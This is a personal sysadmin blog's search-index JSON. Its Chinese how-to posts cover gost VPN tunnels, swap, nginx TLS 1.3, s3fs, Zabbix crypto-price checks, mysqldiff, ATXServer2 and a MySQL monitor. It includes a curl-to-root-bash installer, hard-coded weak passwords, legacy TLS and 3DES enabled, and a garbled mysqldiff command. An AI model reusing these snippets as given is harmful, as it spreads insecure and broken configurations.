{"meta":{"title":"Gary Wu","subtitle":"","description":"GaryWu_Blog","author":"GaryWu","url":"https://garywu520.github.io","root":"/"},"pages":[{"title":"about","date":"2019-02-14T02:42:49.000Z","updated":"2019-02-14T02:43:10.713Z","comments":true,"path":"about/index.html","permalink":"https://garywu520.github.io/about/index.html","excerpt":"","text":""},{"title":"tags","date":"2019-02-14T02:42:13.000Z","updated":"2019-03-12T03:58:03.454Z","comments":true,"path":"tags/index.html","permalink":"https://garywu520.github.io/tags/index.html","excerpt":"","text":""},{"title":"categories","date":"2019-01-01T00:08:08.000Z","updated":"2019-02-14T02:41:59.505Z","comments":true,"path":"categories/index.html","permalink":"https://garywu520.github.io/categories/index.html","excerpt":"","text":""}],"posts":[{"title":"快速部署基于AEAD加密算法的TUN VPN隧道","slug":"快速部署基于AEAD加密算法的TUN-VPN隧道","date":"2020-12-12T12:30:53.000Z","updated":"2021-01-14T10:26:32.322Z","comments":true,"path":"2020/12/12/快速部署基于AEAD加密算法的TUN-VPN隧道/","link":"","permalink":"https://garywu520.github.io/2020/12/12/%E5%BF%AB%E9%80%9F%E9%83%A8%E7%BD%B2%E5%9F%BA%E4%BA%8EAEAD%E5%8A%A0%E5%AF%86%E7%AE%97%E6%B3%95%E7%9A%84TUN-VPN%E9%9A%A7%E9%81%93/","excerpt":"快速部署基于AEAD加密算法的TUN VPN隧道 github release：https://github.com/ginuerzh/gost/releases 版本：Latest Version","text":"快速部署基于AEAD加密算法的TUN VPN隧道 github release：https://github.com/ginuerzh/gost/releases 版本：Latest Version 一、创建加密UDP隧道 服务端 1gost -L tun://AEAD_CHACHA20_POLY1305:Ltdh5121@:3721?net=10.10.100.1/24&amp;name=tun0&amp;mtu=1350 注： 前面格式为：加密算法:加密密码，之后以@连接其他参数 net: 需要指定的是tun虚拟的子网网关 name: 指定虚拟设备名称 mtu: 设置为1350 客户端 1gost -L tun://AEAD_CHACHA20_POLY1305:Ltdh5121@:3721/xx.xx.xx.xx:3721?net=10.10.100.2/24&amp;name=tun0&amp;mtu=1350&amp;route=172.26.32.0/20&amp;gw=10.10.100.1 客户端增加route和gw参数，启动服务后，自动添加路由，无需手动指定 注：route 来指定要通信的服务器所在的内部子网 客户端ping服务器–验证 123$ ping 10.10.100.1PING 10.10.100.1 (10.10.100.1) 56(84) bytes of data.64 bytes from 10.10.100.1: icmp_seq=1 ttl=64 time=84.4 ms 到这里TUN隧道成功建立。 二、配置与服务器跨内网通信 服务器 1234567#开启IP转发sysctl -w net.ipv4.ip_forward=1#设置防火墙规则iptables -t nat -A POSTROUTING -s 10.10.100.0/24 ! -o tun0 -j MASQUERADEiptables -A FORWARD -i tun0 ! -o tun0 -j ACCEPTiptables -A FORWARD -o tun0 -j ACCEPT 客户端 由于客户端配置自动添加路由，故省去手动添加路由 12#手动添加路由ip route add 172.26.32.0/24 dev tun0 从客户端ping远程子网主机 1234$ ping 172.26.32.10PING 172.26.32.10 (172.26.32.10) 56(84) bytes of data.64 bytes from 172.26.32.10: icmp_seq=1 ttl=64 time=82.5 ms64 bytes from 172.26.32.10: icmp_seq=2 ttl=64 time=90.5 ms","categories":[],"tags":[{"name":"openvpn","slug":"openvpn","permalink":"https://garywu520.github.io/tags/openvpn/"},{"name":"TUN","slug":"TUN","permalink":"https://garywu520.github.io/tags/TUN/"},{"name":"TAP","slug":"TAP","permalink":"https://garywu520.github.io/tags/TAP/"},{"name":"route","slug":"route","permalink":"https://garywu520.github.io/tags/route/"}]},{"title":"创建挂载swap","slug":"创建挂载swap","date":"2020-12-05T12:03:01.000Z","updated":"2020-12-05T12:13:54.940Z","comments":true,"path":"2020/12/05/创建挂载swap/","link":"","permalink":"https://garywu520.github.io/2020/12/05/%E5%88%9B%E5%BB%BA%E6%8C%82%E8%BD%BDswap/","excerpt":"linux创建挂载swap算是比较基础的内容，但往往避免不了一些坑，重新总结下","text":"linux创建挂载swap算是比较基础的内容，但往往避免不了一些坑，重新总结下 1234567891011#用8G文件作为swap分区dd if=/dev/zero of=/data/swapfile bs=1M count=8192#修改权限chmod 600 /data/swapfile#格式化mkswap /data/swapfile#临时挂载swapon /data/swapfile 12345#查看UUIDblkid /data/swapfile#开机自动挂载UUID=7bd036bb-1f7a-41a5-b1fd-352074c4b6f4 none swap defaults 0 0 坑：开机自动挂载第二列好多“倒霉催的”写 swap, 重启根本不会自动挂载！ 第二列需要设置为 none 不重启验证自动挂载 12345#已挂载的swap先取消挂载swapoff /data/swapfile#挂载所有swap分区--执行后，如果可以看到挂载的swap分区说明没啥问题。swapon -a","categories":[],"tags":[{"name":"swap","slug":"swap","permalink":"https://garywu520.github.io/tags/swap/"},{"name":"虚拟内存","slug":"虚拟内存","permalink":"https://garywu520.github.io/tags/%E8%99%9A%E6%8B%9F%E5%86%85%E5%AD%98/"},{"name":"swapon","slug":"swapon","permalink":"https://garywu520.github.io/tags/swapon/"},{"name":"swapoff","slug":"swapoff","permalink":"https://garywu520.github.io/tags/swapoff/"}]},{"title":"Nginx启用TLS1.3协议支持","slug":"Nginx启用TLS1-3协议支持","date":"2020-11-28T08:56:44.000Z","updated":"2020-11-28T08:57:46.652Z","comments":true,"path":"2020/11/28/Nginx启用TLS1-3协议支持/","link":"","permalink":"https://garywu520.github.io/2020/11/28/Nginx%E5%90%AF%E7%94%A8TLS1-3%E5%8D%8F%E8%AE%AE%E6%94%AF%E6%8C%81/","excerpt":"区别：TLS1.3 VS TLS1.2 简而言之，优化了以下内容 减少握手次数，减少延迟 ServerHello之后的所有握手消息都进行加密 不再支持gzip压缩、DHE和DSA，取而代之的是使用PSS 删除旧算法，使用AEAD算法替代 1. 首先编译升级安装OpenSSL 安装版本：openssl 1.1.1h 参考：编译安装openssl","text":"区别：TLS1.3 VS TLS1.2 简而言之，优化了以下内容 减少握手次数，减少延迟 ServerHello之后的所有握手消息都进行加密 不再支持gzip压缩、DHE和DSA，取而代之的是使用PSS 删除旧算法，使用AEAD算法替代 1. 首先编译升级安装OpenSSL 安装版本：openssl 1.1.1h 参考：编译安装openssl 2. 配置nginx支持TLS1.3协议12345$ nginx -Vnginx version: nginx/1.16.1built by gcc 4.8.5 20150623 (Red Hat 4.8.5-44) (GCC) built with OpenSSL 1.1.1c FIPS 28 May 2019 (running with OpenSSL 1.1.1h 22 Sep 2020)TLS SNI support enabled cat /etc/nginx/nginx.conf 12#找到Gzip,关闭gzip压缩gzip off; cat /etc/nginx/conf.d/xxx.conf 123456789#新增TLSv1.3ssl_protocols TLSv1 TLSv1.1 TLSv1.2 TLSv1.3;#修改Cipher Suitessl_ciphers TLS13-AES-256-GCM-SHA384:TLS13-CHACHA20-POLY1305-SHA256:TLS13-AES-128-GCM-SHA256:TLS13-AES-128-CCM-8-SHA256:TLS13-AES-128-CCM-SHA256:EECDH+CHACHA20:EECDH+CHACHA20-draft:EECDH+ECDSA+AES128:EECDH+aRSA+AES128:RSA+AES128:EECDH+ECDSA+AES256:EECDH+aRSA+AES256:RSA+AES256:EECDH+ECDSA+3DES:EECDH+aRSA+3DES:RSA+3DES:!MD5;#------------------------- 以下为可选配置 --------------------#配置HSTSadd_header Strict-Transport-Security &quot;max-age=63072000; includeSubdomains; preload&quot;; 12nginx -tnginx -s reload 3. 验证是否成功支持TLSv1.3OpenSSL命令验证 12345678910$ openssl s_client -connect www.xxx.com:443 -tls1_3......New, TLSv1.3, Cipher is TLS_AES_256_GCM_SHA384Server public key is 2048 bitSecure Renegotiation IS NOT supportedSSL-Session: Protocol : TLSv1.3 Cipher : TLS_AES_256_GCM_SHA384 Session-ID: 75570826609753...F794392825D201F4F043FA...... Web在线验证： https://www.cdn77.com/tls-test 或 https://www.cdn77.com/tls-test 4. 配置Chrome支持TLS1.3进入 chrome://flags 页面，搜索“TLS 1.3” —&gt; TLS 1.3 Early Data: enable —&gt;重启浏览器 访问https://www.xxx.com , 打开F12 —&gt; Security","categories":[],"tags":[{"name":"nginx","slug":"nginx","permalink":"https://garywu520.github.io/tags/nginx/"},{"name":"TLS","slug":"TLS","permalink":"https://garywu520.github.io/tags/TLS/"},{"name":"TLS1.3","slug":"TLS1-3","permalink":"https://garywu520.github.io/tags/TLS1-3/"}]},{"title":"数字货币行情coinmon获取命令","slug":"数字货币行情coinmon获取命令","date":"2020-11-27T06:42:56.000Z","updated":"2020-11-27T06:45:15.875Z","comments":true,"path":"2020/11/27/数字货币行情coinmon获取命令/","link":"","permalink":"https://garywu520.github.io/2020/11/27/%E6%95%B0%E5%AD%97%E8%B4%A7%E5%B8%81%E8%A1%8C%E6%83%85coinmon%E8%8E%B7%E5%8F%96%E5%91%BD%E4%BB%A4/","excerpt":"linux命令行打印数字货币行情价格数据， 所有数据来自coincap APIs 安装npm1234curl -sL https://rpm.nodesource.com/setup_10.x | sudo bash -yum install nodejs -ynode --versionnpm --version","text":"linux命令行打印数字货币行情价格数据， 所有数据来自coincap APIs 安装npm1234curl -sL https://rpm.nodesource.com/setup_10.x | sudo bash -yum install nodejs -ynode --versionnpm --version 安装coinmon1npm install -g coinmon 使用1234567$ coinmon -f btcData source from coincap.io at 1:34:06 PM----------------------------------------------------------------------------------------║ Rank │ Coin │ Price (USD) │ Change 24H │ VWAP 24H │ Market Cap │ Supply │ Volume 24H ║----------------------------------------------------------------------------------------║ 1 │ BTC │ 17284.1158 │ -3.76% │ 17068.16 │ 320.4B │ 18.5M │ 15.6B ║---------------------------------------------------------------------------------------- 默认价格单位是USD 1234567$ coinmon -f ETHData source from coincap.io at 1:35:59 PM----------------------------------------------------------------------------------------║ Rank │ Coin │ Price (USD) │ Change 24H │ VWAP 24H │ Market Cap │ Supply │ Volume 24H ║----------------------------------------------------------------------------------------║ 2 │ ETH │ 526.1285 │ -0.88% │ 512.84 │ 59.6B │ 113.3M │ 7.3B ║---------------------------------------------------------------------------------------- 如果想监控价格曲线，可以使用这个工具获取最新值然后提取信息 项目地址：https://github.com/bichenkk/coinmon","categories":[],"tags":[{"name":"BTC","slug":"BTC","permalink":"https://garywu520.github.io/tags/BTC/"},{"name":"coinmon","slug":"coinmon","permalink":"https://garywu520.github.io/tags/coinmon/"},{"name":"ETH","slug":"ETH","permalink":"https://garywu520.github.io/tags/ETH/"}]},{"title":"Linux挂载AWS S3存储桶","slug":"Linux挂载AWS-S3存储桶","date":"2020-11-24T14:00:48.000Z","updated":"2020-11-25T02:15:41.881Z","comments":true,"path":"2020/11/24/Linux挂载AWS-S3存储桶/","link":"","permalink":"https://garywu520.github.io/2020/11/24/Linux%E6%8C%82%E8%BD%BDAWS-S3%E5%AD%98%E5%82%A8%E6%A1%B6/","excerpt":"准备工作 获取S3存储桶Key ID和Key Secret，并创建好S3存储桶 1. 安装s3fs1yum install automake fuse fuse-devel gcc-c++ git libcurl-devel libxml2-devel make openssl-devel","text":"准备工作 获取S3存储桶Key ID和Key Secret，并创建好S3存储桶 1. 安装s3fs1yum install automake fuse fuse-devel gcc-c++ git libcurl-devel libxml2-devel make openssl-devel 编译安装s3fs 12345git clone https://github.com/s3fs-fuse/s3fs-fuse.gitcd s3fs-fuse./autogen.sh./configuremake &amp;&amp; make install 检查s3fs是否安装成功 12$ which s3fs/usr/local/bin/s3fs 创建访问密钥文件 1#格式: echo &lt;KeyID&gt;:&lt;KeySecret&gt; &gt; /etc/passwd-s3fs 12echo AKIxxxxx:2LXBbodxxxxxxxx &gt; /etc/passwd-s3fschmod 600 /etc/passwd-s3fs 2. 手动挂载S3存储桶s3fs的命令格式是： s3fs BUCKET MOUNTPOINT [OPTION]… s3fs [S3存储桶名] [本地目录名] [OPTION] OPTION是可选项，格式是 –o =，常用的options有： 名称 含义 缺省值 passwd_file 指定挂载的密钥文件 connect_timeout 设置超时连接等待的时间，单位秒 300 url 设置访问s3的url http://s3.amazonaws.com endpoint 设置s3存储桶的endpoint us-east-1 allow_other 设置allow_other允许所有用户访问挂载点目录，设置这个选项需要在 /etc/fuse.conf 文件添加user_allow_other选项 手动挂载AWS海外区域S3存储桶 命令格式：s3fs [S3存储桶名] [本地目录名] -o passwd_file=[密钥文件名] -o endpoint=[区域名] 1234567mkdir -p /data/S3#把日本ap-northeast-1区域的s3bucket存储桶，挂载到本地的/data/S3目录下s3fs s3bucket /data/S3 -o passwd_file=/etc/passwd-s3fs -o endpoint=ap-northeast-1$ df -hs3fs 256T 0 256T 0% /data/S3 12#卸载存储桶umount /data/S3 3. 设置开机自动挂载S3存储桶cat /etc/fstab 12#添加如下行：/usr/local/bin/s3fs#s3bucket /data/S3 fuse _netdev,allow_other,endpoint=ap-northeast-1 0 0 4. 挂载错误解决 错误：transport endpoint is not connected 解决方法：如果自动挂载S3用到了allow_other参数，则需要修改/etc/fuse.conf配置文件 12# mount_max = 1000user_allow_other #取消此行的注释 然后重新挂载 12umount /data/S3mount -a 关于局限性利用S3fs可以方便的把S3存储桶挂载在用户本地操作系统目录中，但是由于S3fs实际上是依托于Amazon S3服务提供的目录访问接口，所以不能简单的把S3fs挂载的目录和本地操作系统目录等同使用。用户使用S3f3挂载S3存储桶和直接访问S3服务有类似的使用场景。适用于对不同大小文件对象的一次保存（上传），多次读取（下载）。不适用于对已保存文件经常做随机修改，因为每次在本地修改并保存文件内容都会导致S3fs上传新的文件到Amazon S3去替换原来的文件。 参考：Linux上挂载S3存储桶","categories":[],"tags":[{"name":"S3","slug":"S3","permalink":"https://garywu520.github.io/tags/S3/"},{"name":"AWS","slug":"AWS","permalink":"https://garywu520.github.io/tags/AWS/"},{"name":"对象存储","slug":"对象存储","permalink":"https://garywu520.github.io/tags/%E5%AF%B9%E8%B1%A1%E5%AD%98%E5%82%A8/"}]},{"title":"zabbix监控BTC等币种最新价格","slug":"zabbix监控BTC等币种最新价格","date":"2020-11-19T10:00:54.000Z","updated":"2020-11-19T10:02:30.566Z","comments":true,"path":"2020/11/19/zabbix监控BTC等币种最新价格/","link":"","permalink":"https://garywu520.github.io/2020/11/19/zabbix%E7%9B%91%E6%8E%A7BTC%E7%AD%89%E5%B8%81%E7%A7%8D%E6%9C%80%E6%96%B0%E4%BB%B7%E6%A0%BC/","excerpt":"安装jq json格式化工具 123yum install epel-releaseyum list jqyum install jq","text":"安装jq json格式化工具 123yum install epel-releaseyum list jqyum install jq 1. 币种最新价格获取12#币安API公共接口--币种最新价格https://api.binance.com/api/v3/ticker/price?symbol=DCRUSDT 提取DCR/USDT最新价格 1curl -s https://api.binance.com/api/v3/ticker/price?symbol=DCRUSDT | jq . |grep &quot;price&quot; |awk -F [:] &#x27;&#123;print $NF&#125;&#x27; | awk -F &#x27;&quot;&#x27; &#x27;&#123;print $2&#125;&#x27; 提取BTC/USDT最新价格 1curl -s https://api.binance.com/api/v3/ticker/price?symbol=BTCUSDT | jq . |grep &quot;price&quot; |awk -F [:] &#x27;&#123;print $NF&#125;&#x27; | awk -F &#x27;&quot;&#x27; &#x27;&#123;print $2&#125;&#x27; 2. shell脚本cat dcr_price.sh 12345#!/bin/bashNAME=$1#最新价格获取/bin/curl -s https://api.binance.com/api/v3/ticker/price?symbol=$NAME | /bin/jq . |grep &quot;price&quot; |awk -F [:] &#x27;&#123;print $NF&#125;&#x27; | awk -F &#x27;&quot;&#x27; &#x27;&#123;print $2&#125;&#x27; 1chmod +x dcr_price.sh 3. 配置zabbix agentcat /etc/zabbix/zabbix_agentd.d/userparameter_dcr.conf 1UserParameter=price[*],/var/scripts/dcr_price.sh $1 1systemctl restart zabbix-agent 4. 配置监控项123名称：DCR/USDT键值：price[BTCUSDT] #若监控其他就写price[ETHUSDT]信息类型：浮点数 接下来根据自己的需求，添加触发值","categories":[],"tags":[{"name":"zabbix","slug":"zabbix","permalink":"https://garywu520.github.io/tags/zabbix/"},{"name":"数字货币","slug":"数字货币","permalink":"https://garywu520.github.io/tags/%E6%95%B0%E5%AD%97%E8%B4%A7%E5%B8%81/"},{"name":"交易所","slug":"交易所","permalink":"https://garywu520.github.io/tags/%E4%BA%A4%E6%98%93%E6%89%80/"},{"name":"BTC","slug":"BTC","permalink":"https://garywu520.github.io/tags/BTC/"}]},{"title":"mysql数据差异化比对-mysqldiff","slug":"mysql数据差异化比对-mysqldiff","date":"2020-11-18T06:55:21.000Z","updated":"2020-11-18T07:01:12.927Z","comments":true,"path":"2020/11/18/mysql数据差异化比对-mysqldiff/","link":"","permalink":"https://garywu520.github.io/2020/11/18/mysql%E6%95%B0%E6%8D%AE%E5%B7%AE%E5%BC%82%E5%8C%96%E6%AF%94%E5%AF%B9-mysqldiff/","excerpt":"安装mysqldiff工具 123456yum remove mysql-connector-python -y#centos 7rpm -Uvh http://repo.mysql.com/yum/mysql-connectors-community/el/7/x86_64/mysql-connector-python-2.1.8-1.el7.x86_64.rpmyum install -y mysql-utilities","text":"安装mysqldiff工具 123456yum remove mysql-connector-python -y#centos 7rpm -Uvh http://repo.mysql.com/yum/mysql-connectors-community/el/7/x86_64/mysql-connector-python-2.1.8-1.el7.x86_64.rpmyum install -y mysql-utilities mysql数据库比对 1mysqldiff --server1=root:root123@192.168.0.13:3306 --server2=root:root123@192.168.0.13:3306 --force --di23@192.168.0.13:3306 --force --difftype=sql kr_game_xxx:sntdw_kr_game_xxx mysql表比对 1mysqldiff --server1=root:root123@192.168.0.13:3306 --server2=root:root123@192.168.0.13:3306 --force --di23@192.168.0.13:3306 --force --difftype=sql kr_game_xxx.info:sntdw_kr_game_xxx.info 执行结果类似如下： 12345# WARNING: Using a password on the command line interface can be insecure.# server1 on 192.168.0.13: ... connected.# server2 on 192.168.0.13: ... connected.# Comparing kr_game_70001.role_info to sntdw_kr_game_70001.role_info [PASS]# Success. All objects are the same. ------ 这行信息表示数据库比对结果一致","categories":[],"tags":[{"name":"mysql数据库差异化比对","slug":"mysql数据库差异化比对","permalink":"https://garywu520.github.io/tags/mysql%E6%95%B0%E6%8D%AE%E5%BA%93%E5%B7%AE%E5%BC%82%E5%8C%96%E6%AF%94%E5%AF%B9/"},{"name":"mysqldiff","slug":"mysqldiff","permalink":"https://garywu520.github.io/tags/mysqldiff/"}]},{"title":"Android_IOS设备测试集中管理平台ATXServer2","slug":"Android-IOS设备测试集中管理平台ATXServer2","date":"2020-11-09T09:25:58.000Z","updated":"2020-11-09T09:28:05.412Z","comments":true,"path":"2020/11/09/Android-IOS设备测试集中管理平台ATXServer2/","link":"","permalink":"https://garywu520.github.io/2020/11/09/Android-IOS%E8%AE%BE%E5%A4%87%E6%B5%8B%E8%AF%95%E9%9B%86%E4%B8%AD%E7%AE%A1%E7%90%86%E5%B9%B3%E5%8F%B0ATXServer2/","excerpt":"一、atx-server2介绍​ Android和IOS设备集中管理平台 ​ 项目地址：https://github.com/openatx/atxserver2 ​ 其他参考：atx-server 安卓集群管理 安装运行及自动化的实践","text":"一、atx-server2介绍​ Android和IOS设备集中管理平台 ​ 项目地址：https://github.com/openatx/atxserver2 ​ 其他参考：atx-server 安卓集群管理 安装运行及自动化的实践 二、手动部署1. 编译安装Python3.6.12. 安装RethinkDB12345678$ cat &lt;&lt; EOF &gt; /etc/yum.repos.d/rethinkdb.repo[rethinkdb]name=RethinkDBenabled=1baseurl=https://download.rethinkdb.com/repository/centos/7/x86_64/gpgkey=https://download.rethinkdb.com/repository/raw/pubkey.gpggpgcheck=1EOF 12345yum install -y rethinkdbrm -f /etc/init.d/rethinkdbmkdir -p /var/lib/rethinkdb/instances.d/datachown -R rethinkdb.rethinkdb /var/lib/rethinkdbchown -R rethinkdb.rethinkdb /etc/rethinkdb supervisor管理启动 1234567891011[program:rethinkdb]command=/usr/bin/rethinkdb --runuser rethinkdb --rungroup rethinkdb --bind all --http-port 8000 --pid-file /etc/rethinkdb/rethinkdb.pid --directory /var/lib/rethinkdb/instances.d/datastdout_logfile=/var/log/rethinkdb.logstderr_logfile=/var/log/rethinkdb.logusername=rethinkdbautostart=trueautorestart=truestartsecs=5priority=1stopasgroup=truekillasgroup=true 3. 安装并启动atxserver212git clone https://github.com/garywu520/atxserver2.gitmv atxserver2 /opt/ 123#安装依赖cd /opt/atxserver2pip3 install -r requirements.txt 启动atxserver2 1python3 main.py --port 8008 --auth simple 参数含义： –auth simple —&gt; 默认是一个非常simple的认证，输入邮箱就可以 –port 8008 —&gt; 指定atxserver2的访问端口 rethinkdb数据库 —&gt; 默认连接的地址: localhost:28015 1234567#如果需要修改数据库，使用linux的环境变量实现。#cat /etc/profile 添加如下内容：export RDB_HOST=localhostexport RDB_PORT=28015export RDB_USER=adminexport RDB_PASSWD=export RDB_DBNAME=atxserver2 supervisor启动管理 123456789101112[program:atxserver2]directory=/opt/atxserver2/command=/opt/py3/bin/python3 main.py --port 8008 --auth simplestdout_logfile=/var/log/atxserver2.logstderr_logfile=/var/log/atxserver2.logusername=rootautostart=trueautorestart=truestartsecs=5priority=1stopasgroup=truekillasgroup=true 4. 浏览器访问http://192.168.0.13:8008 , 随意输入一个邮箱地址即完成验证。 注：默认第一个登录的用户会成为管理员 管理员有哪些特权呢？ 可以释放他人正在使用的设备。（按住ALT，然后双击正在使用按钮） 使用他人的身份占用设备（参考API文档） 获取设备的source信息（参考API文档） 将他人设置为管理员，导航栏可以看到后台管理链接 有权修改资产编号字段 5. Android设备接入 需要借助另一个项目：atxserver2-android-provider 部署Provider Provider可以通过adb track-devices自动发现已经接入的设备，当手机通过USB接入到电脑上时，会自动给手机安装minicap, minitouch, atx-agent, app-uiautomator-[test].apk, whatsinput-apk 1234curl -sL https://rpm.nodesource.com/setup_8.x | bash -yum install -y nodejsnode -vnpm -v 123456git clone https://github.com/openatx/atxserver2-android-providercd atxserver2-android-providernpm installpip install -r requirements.txtmv atxserver2-android-provider /opt/pip3 install humanize 安装adb环境 1234wget https://dl.google.com/android/repository/sdk-tools-linux-3859397.zipunzip sdk-tools-linux-3859397.zipmkdir /opt/android_sdkmv tools /opt/android_sdk cat /etc/profile 123export PATH USER LOGNAME MAIL HOSTNAME HISTSIZE HISTCONTROLexport PATH=$PATH:/opt/android_sdk/tools/binexport PATH=$PATH:/opt/android_sdk/platform-tools 安装配置Jdk 1yum install -y java-1.8.0-openjdk java-1.8.0-openjdk-devel 12345678#下载platform--https://developer.android.google.cn/studio/releases/platform-tools.htmlwget https://dl.google.com/android/repository/platform-tools_r30.0.5-linux.zipunzip platform-tools_r30.0.5-linux.zip mv platform-tools /opt/android_sdk/#查看adb版本source /etc/profileadb version supervisor管理启动 123456789101112[program:atxserver2_provider]directory=/opt/atxserver2-android-providercommand=/opt/py3/bin/python3 main.py --port 8001 --server http://127.0.0.1:8008 stdout_logfile=/var/log/atxserver2_provider.logstderr_logfile=/var/log/atxserver2_provider.logusername=rootautostart=trueautorestart=truestartsecs=5priority=1stopasgroup=truekillasgroup=true 参数详解： –port : 本地监听的端口号 –server: atxserver2的地址 –allow-remote：允许远程设备，默认会忽略类似10.0.0.1:5555的设备 –owner: 邮箱地址或用户所在Group名，如果设置了，默认连接的设备都为私有设备，只有owner或管理员账号能看到 最终的ProviderURL: http://192.168.0.13:8001 Provider服务可以通过adb track-devices自动发现已经接入的设备，当手机接入到电脑上时，会自动给手机安装minicap, minitouch, atx-agent, app-uiautomator-[test].apk, whatsinput-apk 接入的设备需要配置好开发者选项, 不同设备的设置方案放到了该项目的Issue中, tag: device-settings 如果没有该机型，可以自助添加 后言项目整体运行良好，支持IOS(未测试)和Android设备(已测试)连接。而结合自己的测试场景：游戏分为各个地区的版本，每个版本需要连接不同的WiFi(实际是不同的代理)，不能做到使用的WIFI统一(WIFI连接ATXServer2我没测试成功，USB连接稳定)。另外，apk安装暂且只能上传apk文件，有些测试包需要额外导入obb文件，用起来很难受了，需要尝试使用adb push命令来完成。使用成本反而更大了。 总之，感谢作者的努力，项目初衷不错，能满足一定的使用场景，期待后期功能更加完善，再考虑使用。 参考： https://github.com/garywu520/atxserver2 自动化https://testerhome.com/topics/11546","categories":[],"tags":[{"name":"Android","slug":"Android","permalink":"https://garywu520.github.io/tags/Android/"},{"name":"IOS","slug":"IOS","permalink":"https://garywu520.github.io/tags/IOS/"},{"name":"atxserver","slug":"atxserver","permalink":"https://garywu520.github.io/tags/atxserver/"},{"name":"atxserver2","slug":"atxserver2","permalink":"https://garywu520.github.io/tags/atxserver2/"},{"name":"测试平台","slug":"测试平台","permalink":"https://garywu520.github.io/tags/%E6%B5%8B%E8%AF%95%E5%B9%B3%E5%8F%B0/"}]},{"title":"MySQL Monitor可视化监控","slug":"MySQL-Monitor可视化监控","date":"2020-10-31T12:56:39.000Z","updated":"2020-10-31T12:59:30.479Z","comments":true,"path":"2020/10/31/MySQL-Monitor可视化监控/","link":"","permalink":"https://garywu520.github.io/2020/10/31/MySQL-Monitor%E5%8F%AF%E8%A7%86%E5%8C%96%E7%9B%91%E6%8E%A7/","excerpt":"一、环境 github项目：https://github.com/hcymysql/mysql_monitor 已安装MySQL和Nginx 二、安装环境并下载源码1234$ yum install -y httpd php php-mysqlnd$ yum install -y python-simplejson$ php -m |grep mysqlndmysqlnd","text":"一、环境 github项目：https://github.com/hcymysql/mysql_monitor 已安装MySQL和Nginx 二、安装环境并下载源码1234$ yum install -y httpd php php-mysqlnd$ yum install -y python-simplejson$ php -m |grep mysqlndmysqlnd 12345wget https://github.com/hcymysql/mysql_monitor/archive/master.zipunzip master.zipmkdir /var/www/html/mysql_monitorcd mysql_monitor-mastercp -R ./* /var/www/html/mysql_monitor/ 1234#注：邮件和微信报警调用的第三方工具，所以这里要赋予可执行权限755cd /var/www/html/mysql_monitor/chmod 755 ./mail/sendEmailchmod 755 ./weixin/wechat.py 三、部署mysql_monitor1. 导入MySQL Monitor监控工具表结构（sql_db库）12cd /var/www/html/mysql_monitor/mysql -uroot -p &lt; mysql_monitor_schema.sql 2. 修改conn.php配置文件vim /var/www/html/mysql_monitor/conn.php 1234#MySQL Monitor监控工具表结构（sql_db库）连接信息...$con = mysqli_connect(&quot;127.0.0.1&quot;,&quot;root&quot;,&quot;root123&quot;,&quot;sql_db&quot;,&quot;3306&quot;) or die(&quot;数据库链接错误&quot;.mysqli_error($con));... 3. 修改报警信息 修改邮件报警信息 vim /var/www/html/mysql_monitor/mail/mail.php 123#仅修改发件人地址、账号、密码system(&quot;./mail/sendEmail -f xxx@xxx.com -t &#x27;&#123;$this-&gt;send_mail_to_list&#125;&#x27; -s smtp.139.com:25 -u &#x27;&#123;$this-&gt;alarm_subject&#125;&#x27; -o message-charset=utf8 -o message-content-type=html -m &#x27;报警信息：&#123;$this-&gt;alarm_info&#125;&#x27; -xu xxx@xxx.com -xp &#x27;123456&#x27; -o tls=no&quot;); 修改微信报警信息 vim /var/www/html/mysql_monitor/weixin/wechat.py 1#填写微信告警必要的信息，参考： https://github.com/X-Mars/Zabbix-Alert-WeChat/blob/master/README.md 4. 配置定时任务123#mysql_monitor*/1 * * * * /usr/bin/php /var/www/html/mysql_monitor/check_mysql_repl.php &gt; /dev/null 2 &gt;&amp;1*/1 * * * * /usr/bin/php /var/www/html/mysql_monitor/check_mysql_status.php &gt; /dev/null 2 &gt;&amp;1 check_mysql_status.php（用来采集被监控端MySQL状态信息和触发报警） check_mysql_repl.php（用来采集被监控端MySQL主从复制信息和触发报警） 5. 更改页面自动刷新频率123cd /var/www/html/mysql_monitor/vim mysql_status_monitor.phpvim mysql_repl_monitor.php 12http-equiv=&quot;refresh&quot; content=&quot;60&quot;#默认页面每600秒自动刷新一次。 6. 修改Apache端口vim /etc/httpd/conf/httpd.conf 1Listen 8000 7. 启动Apache12systemctl enable httpdsystemctl start httpd 8. Web访问被监控端MySQL状态信息和触发报警 http://IP/mysql_monitor/mysql_status_monitor.php 被监控端MySQL主从复制信息和触发报警 http://IP/mysql_monitor/mysql_repl_monitor.php 9. Nginx反向代理12345678...... location /db_monitor/ &#123; proxy_set_header X-Real-IP $remote_addr; proxy_set_header Host $host; proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for; proxy_pass http://localhost:8000/; &#125;...... 四、录入资产Web界面不提供任何形式的权限编辑，所以资产需要通过insert语句插入数据库 1234$ mysql -uroot -p &gt; use sql_db;&gt; insert into mysql_status_info(id,ip,dbname,user,pwd,port,monitor,send_mail,send_mail_to_list,send_weixin,send_weixin_to_list,alarm_threads_running,threshold_alarm_threads_running,alarm_repl_status,threshold_warning_repl_delay) values (1,&#x27;192.168.0.10&#x27;,&#x27;game_123&#x27;,&#x27;root&#x27;,&#x27;root123&#x27;,3306,1,1,&#x27;xxx@xxx.com&#x27;,1,&#x27;xx&#x27;,NULL,NULL,NULL,NULL); ip字段含义：输入被监控MySQL的IP地址 dbname字段含义：输入被监控MySQL的数据库名 user字段含义：输入被监控MySQL的用户名（最好给ALL管理员权限） pwd字段含义：输入被监控MySQL的密码 port字段含义：输入被监控MySQL的端口号 monitor字段含义：0为关闭监控（也不采集数据，直接跳过）;1为开启监控（采集数据） send_mail字段含义：0为关闭邮件报警;1为开启邮件报警 send_mail_to_list字段含义：邮件人列表 send_weixin字段含义：0为关闭微信报警;1为开启微信报警 send_weixin_to_list字段含义：微信公众号 threshold_alarm_threads_running字段含义：设置连接数阀值（单位个） 